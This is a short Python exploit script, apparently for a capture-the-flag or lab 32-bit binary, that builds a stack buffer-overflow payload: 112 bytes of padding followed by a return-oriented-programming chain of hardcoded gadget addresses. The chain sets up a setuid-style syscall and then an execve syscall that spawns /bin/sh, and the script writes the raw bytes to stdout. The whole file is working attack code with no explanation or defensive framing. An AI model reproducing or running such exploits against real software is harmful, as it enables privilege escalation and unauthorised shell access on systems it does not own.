import sys
if __name__ == '__main__':
    eax = 0x080563d0.to_bytes(4, "little") #xor eax, eax ; ret
    inc_eax = (0x0805e8ad.to_bytes(4, "little")) #inc eax ; ret
    ebx = 0x080481d1.to_bytes(4, "little") # pop ebx ; ret
    inc_ebx = 0x0805e27b.to_bytes(4, "little") #inc ebx ; ret
    int80 = 0x080732d0.to_bytes(4, "little") #int 0x80
    ecx = 0x08094141.to_bytes(4, "little") #inc ecx ; ret
    attack = b"A"*112
    attack += eax+inc_eax*23+ebx+0xffffffff.to_bytes(4, "little")+inc_ebx+int80
    ebx = 0x080729c1.to_bytes(4, "little") #pop edx ; pop ecx ; pop ebx ; ret
    inc_ebx = 0x0805e085.to_bytes(4, "little") #inc edx ; ret
    attack += eax+inc_eax*11+ebx+0xffffffff.to_bytes(4, "little")*2+0xFFF69388.to_bytes(4, "little")+inc_ebx+ecx+int80+b'/bin/sh'
    sys.stdout.buffer.write(attack)
